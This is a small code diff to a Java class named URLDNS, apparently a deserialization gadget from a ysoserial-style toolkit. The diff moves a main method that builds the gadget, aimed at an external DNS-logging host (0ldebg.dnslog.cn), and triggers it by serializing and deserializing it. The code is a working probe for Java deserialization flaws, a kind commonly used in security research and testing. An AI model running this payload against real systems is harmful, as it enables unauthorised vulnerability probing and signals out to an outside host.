@@ -9,6 +9,12 @@ import java.util.HashMap;
 
 @SuppressWarnings("all")
 public class URLDNS {
+    public static void main(final String[] args) throws Exception {
+        URLDNS c = new URLDNS();
+        Object o = c.getObject("http://0ldebg.dnslog.cn");
+        SerUtil.deserializeObject(SerUtil.serializeObject(o));
+    }
+
     public Object getObject(final String url) throws Exception {
 
         //Avoid DNS resolution during payload creation
@@ -22,12 +28,6 @@ public class URLDNS {
         Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
 
         return ht;
-    }
-
-    public static void main(final String[] args) throws Exception {
-        URLDNS c = new URLDNS();
-        Object o = c.getObject("http://0ldebg.dnslog.cn");
-        SerUtil.deserializeObject(SerUtil.serializeObject(o));
     }
 
     /**
